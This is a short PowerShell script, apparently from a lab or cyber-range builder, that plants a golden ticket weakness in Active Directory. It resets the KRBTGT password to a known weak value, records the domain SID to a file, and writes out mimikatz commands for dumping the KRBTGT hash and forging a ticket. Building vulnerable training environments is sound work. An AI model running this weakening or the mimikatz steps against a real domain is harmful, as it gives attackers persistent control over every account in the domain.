# vuln: golden_ticket_target | severity: critical
Write-Host "[VULN] Injecting Golden Ticket vulnerability..."
Import-Module ActiveDirectory -ErrorAction SilentlyContinue
# Weaken KRBTGT password — makes golden tickets easier to forge
try {
    $sec = ConvertTo-SecureString "Krbtgt@123!" -AsPlainText -Force
    Set-ADAccountPassword -Identity "krbtgt" -NewPassword $sec -Reset -ErrorAction SilentlyContinue
    Write-Host "[+] KRBTGT password weakened to: Krbtgt@123!"
} catch { Write-Host "[!] KRBTGT: $($_.Exception.Message)" }
# Dump krbtgt hash info
$krbtgt = Get-ADUser krbtgt -Properties *
$domainSID = (Get-ADDomain).DomainSID
Set-Content -Path "C:\Temp\golden_ticket_info.txt" -Value "Domain SID: $domainSID`nKRBTGT Account: $($krbtgt.SamAccountName)`nAttack: mimikatz # lsadump::lsa /patch -> get krbtgt hash`nmimikatz # kerberos::golden /user:Administrator /domain:cyberstrike.mil /sid:<SID> /krbtgt:<hash> /ptt"
Write-Host "[VULN] KRBTGT weakened. Dump hash for golden ticket attack."
